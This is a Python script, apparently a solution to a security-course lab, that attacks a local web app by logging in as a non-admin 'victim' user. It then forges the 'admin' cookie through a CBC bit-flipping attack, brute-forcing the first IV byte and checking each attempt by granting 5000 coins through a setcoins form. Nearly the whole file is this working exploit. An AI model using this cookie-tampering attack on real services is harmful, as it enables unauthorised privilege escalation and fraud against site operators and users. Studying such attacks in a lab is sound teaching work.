from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok


def do_attack():
	sess = Session()
  #you'll need to change this to a non-admin user, such as 'victim'.
	uname ="victim"
	pw = "victim"
	assert(do_login_form(sess, uname,pw))
	#Maul the admin cookie in the 'sess' object here
 
	# the block size is 16 bytes
	# in admin cookie, we got 2 blocks of 16 bytes
	block_size = 16
 
	# get the admin cookie
	admin_cookie = sess.cookies.get_dict()['admin']

	# keep chaning the first byte of the IV until the first byte of the decrypted plaintext is 1
	# we can't know the decrypted plaintext so we need to bruteforce and keep using do_setcoins_form to check if the attack was successful
	first_byte_mask = 0
	ctx = bytes.fromhex(admin_cookie)
	iv, ctx = ctx[:block_size], ctx[block_size:]

	while first_byte_mask < 256:
		modified_iv = bytes([iv[0] ^ first_byte_mask]) + iv[1:]
		modified_ctx = modified_iv + ctx
		modified_ctx = modified_ctx.hex()
		# delete the old admin cookie
		del sess.cookies['admin']
		# set the new admin cookie
		sess.cookies.set('admin', modified_ctx)

		# check if the attack was successful
		res = do_setcoins_form(sess, uname, 5000)
		if res:
			break
		else:
			# increment the first byte mask
			first_byte_mask += 1


	# target_uname = uname
	# amount = 5000
	# result = do_setcoins_form(sess, target_uname,amount)
	# print("Attack successful? " + str(result))
	if first_byte_mask == 256:
		print("Attack successful? False")
	else:
		print("Attack successful? True")

if __name__=='__main__':
	do_attack()
